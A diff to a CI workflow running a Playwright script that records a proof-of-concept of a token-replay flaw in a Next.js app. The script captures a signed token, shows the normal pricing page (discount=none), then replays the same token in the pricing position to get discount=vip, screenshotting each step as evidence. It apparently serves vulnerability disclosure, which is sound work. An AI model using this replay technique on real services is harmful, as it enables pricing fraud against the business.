@@ -135,24 +135,35 @@ jobs:
             }, { title, lines });
           }
 
+          await page.goto(origin + '/', { waitUntil: 'networkidle' });
+          await annotate('STEP 1 / 3 — capture legitimate source token', [
+            'Live page: ' + page.url(),
+            'Observed application result: navigation=new',
+            'Extracted signed source token SHA-256: ' + tokenHash,
+            'No token modification or re-signing performed',
+          ]);
+          await page.waitForTimeout(3000);
+
           await page.goto(origin + baselinePath, { waitUntil: 'networkidle' });
-          await annotate('BASELINE — legitimate target token', [
+          await annotate('STEP 2 / 3 — normal pricing flow', [
+            'Live page: ' + page.url(),
             'Observed application result: discount=none',
-            'Source token SHA-256: ' + tokenHash,
-            'Baseline path: /pricing (normal documented flow)',
+            'This is the expected target-group result before replay',
           ]);
           await page.screenshot({ path: 'evidence/01-baseline-real-production-response.png', fullPage: true });
-          await page.waitForTimeout(2200);
+          await page.waitForTimeout(3000);
 
           await page.goto(origin + replayPath, { waitUntil: 'networkidle' });
-          await annotate('EXPLOIT — source token replayed as target token', [
+          await annotate('STEP 3 / 3 — exploit performed', [
+            'Live page contains the source token in BOTH source and pricing positions',
             'Observed application result: discount=vip',
             'Source token SHA-256: ' + tokenHash,
             'Same source token reused in pricing position: true',
             'Token modified: false',
+            'RESULT: cross-group replay changed the pricing decision',
           ]);
           await page.screenshot({ path: 'evidence/02-replay-real-production-response.png', fullPage: true });
-          await page.waitForTimeout(3200);
+          await page.waitForTimeout(5000);
 
           fs.writeFileSync('evidence/evidence.txt', [
             'SOURCE=real Next.js production server responses',
